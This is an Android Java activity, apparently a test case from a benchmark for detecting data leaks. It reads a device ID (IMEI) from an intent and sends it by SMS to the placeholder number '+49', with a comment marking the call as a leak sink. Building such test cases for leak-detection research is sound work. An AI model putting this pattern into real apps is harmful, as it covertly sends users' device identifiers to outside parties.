package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;


public class Activity2 extends Activity {

    private String imei = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Get the message from the intent
        Intent intent = getIntent();
        imei = intent.getStringExtra("dev id: ");

        setContentView(R.layout.activity_activity2);
    }

    private void sendMessage(){
        //Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
    }

    public void sendMessageWrapper(View view) {
        sendMessage();
    }

}
